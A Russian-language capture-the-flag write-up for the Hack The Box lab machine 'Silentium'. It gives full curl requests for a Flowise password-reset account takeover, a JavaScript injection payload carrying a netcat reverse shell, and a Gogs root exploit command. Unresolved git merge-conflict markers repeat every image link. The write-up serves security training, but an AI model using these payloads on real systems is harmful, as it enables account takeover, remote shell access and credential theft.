---
share: true
---
1 сканируем ip-адрес машины с помощью nmap:

Видим 2 порта ssh (22) и http (80) после проверки OpenSSH и nginx на уязвимости ничего не находим значит идём смотреть что находится по данным портам по порту ssh не находим ничего стоящего, а на порту 80 нас встречает веб-сайт

<<<<<<< HEAD
![[Writeups/Machine_HTB/files_photo/Silentium/nmap_scan.png]]
=======
![nmap_scan.png](Writeups/Machine_HTB/files_photo/Silentium/nmap_scan.png)
>>>>>>> 2846cd91e15c1a78990fa2e576d93b81ef983328

2 проверка веб-сайта

Видим что сайт недоступен идём в `/etc/hosts` и добавляем туда сайт:
`<target-ip> silentium.htb` и перезапускаем сайт

<<<<<<< HEAD
![[port_80_browser.png]]
![[working_site.png]]
=======
![port_80_browser.png](port_80_browser.png)
![working_site.png](working_site.png)
>>>>>>> 2846cd91e15c1a78990fa2e576d93b81ef983328

3 ищем с чего начать

После того как сайт заработал идём искать почты/имена или другие данные его владельцев/менеджеров и так далее.


<<<<<<< HEAD
![[name_leadership_on_site.png]]
=======
![name_leadership_on_site.png](name_leadership_on_site.png)
>>>>>>> 2846cd91e15c1a78990fa2e576d93b81ef983328

4 сканируем сайт

Натыкаемся на 3 человек Бена, Маркуса и Елену. Теперь идём смотреть какие пути есть у этого сайта используя команду `gobuster vhost -u "silentium.htb" -w /usr/share/wordlists/dirb/common.txt --append-domain` ищем какие пути у нас есть

<<<<<<< HEAD
![[gobuster_scan.png]]
=======
![gobuster_scan.png](gobuster_scan.png)
>>>>>>> 2846cd91e15c1a78990fa2e576d93b81ef983328

5 точка входа

Gobuster нашёл нам один путь это `staging.silentium.htb` пробуем по нему перейти

<<<<<<< HEAD
![[staging_error.png]]

Как и с `silentium.htb` добавляем `staging.silentium.htb` в `/etc/hosts`

![[staging_working.png]]
=======
![staging_error.png](staging_error.png)

Как и с `silentium.htb` добавляем `staging.silentium.htb` в `/etc/hosts`

![staging_working.png](staging_working.png)
>>>>>>> 2846cd91e15c1a78990fa2e576d93b81ef983328

6 поиск уязвимостей

После чего видим приглашение ко входу для Flowise гуглим что это такое и находим следующию информацию:

```
Flowise — это визуальная open-source платформа, созданная для того, чтобы собирать чат-ботов, AI-агентов и сложные приложения на базе больших языковых моделей (LLM) без необходимости писать код.
```

теперь гуглим на эту платформу уязвимости с `PoC`, находим несколько штук `CVE-2025-58434`, `CVE-2025-59528`, `CVE-2025-59527`.
После изучения этих CVE на `Github` выбираем `CVE-2025-58434` которая позволяет сгенерировать с помощью временного токена новые данные для пользователя а именно таким способом:

```
curl -i -X POST https://<target>/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"<victim@example.com>"}}'
	Response (201 Created)
{
  "user": {
    "id": "<redacted-uuid>",
    "name": "<redacted>",
    "email": "<victim@example.com>",
    "credential": "<redacted-hash>",
    "tempToken": "<redacted-tempToken>",
    "tokenExpiry": "2025-08-19T13:00:33.834Z",
    "status": "active"
  }
}
```

```
curl -i -X POST https://<target>/api/v1/account/reset-password \
  -H "Content-Type: application/json" \
  -d '{
        "user":{
          "email":"<victim@example.com>",
          "tempToken":"<redacted-tempToken>",
          "password":"NewSecurePassword123!"
        }
      }'
```

подробнее об этой уязвимости можно прочесть здесь:
https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-wgpv-6j63-x5ph

7 Использование эксплойта

открываем два терминала и пытаемся подобрать имя для почты из тех что мы нашли ранее.
Получается 3 варианта 
```
ben@silentium.htb
marcus@silentium.htb
elena@silentium.htb
```

пробуем подставить их в первый запрос `curl`

<<<<<<< HEAD
![[curl_request.png]]

Как видим нам откликается только почта Бена теперь подставляем полученный `temptoken` во второй запрос

![[succes_curl_change_password.png]]

Как видим мы поменяли пароль Бену теперь заходим под его обновлёнными данными

![[login.png]]

Видим следующий `Dashboard` просмотрев его меня заинтересовал раздел API Keys

![[dashboard.png]]![[api_key_found.png]]
=======
![curl_request.png](curl_request.png)

Как видим нам откликается только почта Бена теперь подставляем полученный `temptoken` во второй запрос

![succes_curl_change_password.png](succes_curl_change_password.png)

Как видим мы поменяли пароль Бену теперь заходим под его обновлёнными данными

![login.png](login.png)

Видим следующий `Dashboard` просмотрев его меня заинтересовал раздел API Keys

![dashboard.png](dashboard.png)![api_key_found.png](api_key_found.png)
>>>>>>> 2846cd91e15c1a78990fa2e576d93b81ef983328

Теперь вернёмся к найденным CVE а именно к `CVE-2025-59528` благодаря которой можно получить `RCE` для входа на сервер подробнее про это можно почитать тут: https://github.com/advisories/GHSA-3gcm-f6qx-ff7p

```
curl -X POST http://localhost:3000/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer tmY1fIjgqZ6-nWUuZ9G7VzDtlsOiSZlDZjFSxZrDd0Q" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"echo !!RCE-OK!! >/tmp/RCE.txt\");return 1;})()})"
    }
  }'
```

сама CVE представляет собой обычный POST запрос с валидным токином на mcp сервер.
Опробуем его в деле:

для этого поднимаем слушатель на порту 4444 с помощью `nc -lvnp 4444`

<<<<<<< HEAD
![[nc_listener.png]]
=======
![nc_listener.png](nc_listener.png)
>>>>>>> 2846cd91e15c1a78990fa2e576d93b81ef983328

далее генерируем revershell для нашего POST запроса
можно воспользоваться этим сайтом: https://www.revshells.com/
Перебрав несколько нерабочих вариантов я остановился на этом `rm -f /tmp/b; mkfifo /tmp/b; /bin/sh -i 2>&1 0</tmp/b | nc $YOURIP $PORT 1>/tmp/b` это базовый shell для netcat 

теперь переписываем наш запрос вот так:

```
curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <your-api-hey>" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"`rm -f /tmp/b; mkfifo /tmp/b; /bin/sh -i 2>&1 0</tmp/b | nc <your-ip> <port> 1>/tmp/b`\");return 1;})()})"
    }
  }'
```

где заменяем параметры с api ключами, ip и порт на нужные нам нажимаем Enter и получаем shell

<<<<<<< HEAD
![[shell.png]]

далее осматриваемся в директориях и видим что мы находимся в docker контейнере гуглим каким способом можно выбраться или какие данные можно получить из него

![[list_dir.png]]

К сожалению выбраться из него нельзя тогда ищем как можно найти что то полезное в этом контейнере и находим что через команду env можно вывести информацию о всех переменных окружения

![[env_environment_variable.png]]
=======
![shell.png](shell.png)

далее осматриваемся в директориях и видим что мы находимся в docker контейнере гуглим каким способом можно выбраться или какие данные можно получить из него

![list_dir.png](list_dir.png)

К сожалению выбраться из него нельзя тогда ищем как можно найти что то полезное в этом контейнере и находим что через команду env можно вывести информацию о всех переменных окружения

![env_environment_variable.png](env_environment_variable.png)
>>>>>>> 2846cd91e15c1a78990fa2e576d93b81ef983328

пробуем эти данные для входа в ssh и пароль `r04D!!_R4ge` подходит для ssh сессии 
прописываем ls -la и находим первый флаг

<<<<<<< HEAD
![[user_flag.png]]

Теперь надо поднятся до root первым делом смотрим что запущено на системе с помощью `ps aux` и натыкаемся на интересную программу `gogs`

![[gogs_web.png]]
=======
![user_flag.png](user_flag.png)

Теперь надо поднятся до root первым делом смотрим что запущено на системе с помощью `ps aux` и натыкаемся на интересную программу `gogs`

![gogs_web.png](gogs_web.png)
>>>>>>> 2846cd91e15c1a78990fa2e576d93b81ef983328

 гуглим что это такое:

```
Gogs (Go Git Service) — это легковесный веб-интерфейс для хостинга Git-репозиториев и совместной разработки, который можно развернуть на собственном сервере (_self-hosted_ решение). Он считается отличной и очень экономной альтернативой GitHub или GitLab для небольших команд.
```

И так теперь поищем эксплойты для этого Gogs'a и находим `CVE-2025-8110`. Подробнее можно узнать здесь: https://github.com/TYehan/CVE-2025-8110-Gogs-RCE-Exploit

После проделывания всех манипуляций запускаем следующую команду:

```
python3 exploit.py -u http://localhost:3001 -un <YOUR_USER> -pw <YOUR_PASS> -t <YOUR_TOKEN> -lh <YOUR_IP> -lp 5555
```

И получаем root доступ и выводим root flag:

<<<<<<< HEAD
![[root_success.png]]
![[root_flag.png]]
=======
![root_success.png](root_success.png)
![root_flag.png](root_flag.png)
>>>>>>> 2846cd91e15c1a78990fa2e576d93b81ef983328
